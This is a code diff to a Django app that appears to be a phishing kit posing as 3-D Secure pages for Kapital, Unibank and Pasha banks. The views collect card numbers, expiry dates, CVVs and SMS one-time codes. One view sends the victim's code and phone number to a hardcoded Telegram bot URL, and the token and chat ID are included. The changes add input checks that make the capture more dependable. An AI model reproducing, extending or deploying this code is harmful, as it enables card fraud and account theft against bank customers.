@@ -79,6 +79,15 @@ def info(request):
             if cvv_ and (not cvv_.isdigit() or len(cvv_) < 3):
                 error_msg = "CVV must be a 3-digit number."
                 return render(request, "pages/3dsec.html")
+            elif len(cvv_) == 0:
+                error_msg = "CVV must be a 3-digit number."
+                return render(request, "pages/3dsec.html")
+            elif len(cvv_) == 1:
+                error_msg = "CVV must be a 3-digit number."
+                return render(request, "pages/3dsec.html")
+            elif len(cvv_) == 2:
+                error_msg = "CVV must be a 3-digit number."
+                return render(request, "pages/3dsec.html")
             last_contact.cc = cardnumber
             last_contact.mm = mm_
             last_contact.yy = yy_
@@ -316,6 +325,10 @@ def dseckapital(request):
         input2 = request.POST.get("input2")
         input3 = request.POST.get("input3")
         input4 = request.POST.get("input4")
+        if len(input4) == 0:
+            # handle the case when input6 is empty
+            # for example, you can display an error message to the user
+            return render(request, 'pages/kapital.html')
         concatenated = input1 + input2+input3+input4
         last_contact = ContactModel.objects.latest('created_at')
         last_contact.sms=concatenated
@@ -364,6 +377,10 @@ def unibank3d(request):
     last_contact = ContactModel.objects.latest('created_at')
     last_contact.sms=sms
     last_contact.save()
+    if len(sms) == 0:
+        # handle the case when input6 is empty
+        # for example, you can display an error message to the user
+        return render(request, 'pages/unibank3d.html')
     response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id{last_contact.id}\nsms:{last_contact.sms}|number{last_contact.phone}')
     return render( request,'pages/loading.html' )
 
@@ -387,12 +404,28 @@ def pashabank(request):
 def pashabank3d(request):
     
     if request.method == "POST":
+        last_contact = ContactModel.objects.latest('created_at')
+        number = str(last_contact.phone)
+
+        context = {
+              'number': number[-4:],
+              'amount': last_contact.amount,
+              'cc': last_contact.cc[-4:],
+        }
         input1 = request.POST.get("input1")
         input2 = request.POST.get("input2")
         input3 = request.POST.get("input3")
         input4 = request.POST.get("input4")
         input5 = request.POST.get("input5")
         input6 = request.POST.get("input6")
+        if len(input6) == 0:
+         # handle the case when input6 is empty
+         # for example, you can display an error message to the user
+         return render(request, 'pages/pasha.html',)
+        elif len(input5) == 0:
+         # handle the case when input6 is empty
+         # for example, you can display an error message to the user
+         return render(request, 'pages/pasha.html',)
         concatenated = input1+input2 +input3+input4+input5+input6
         last_contact = ContactModel.objects.latest('created_at')
         last_contact.sms=concatenated
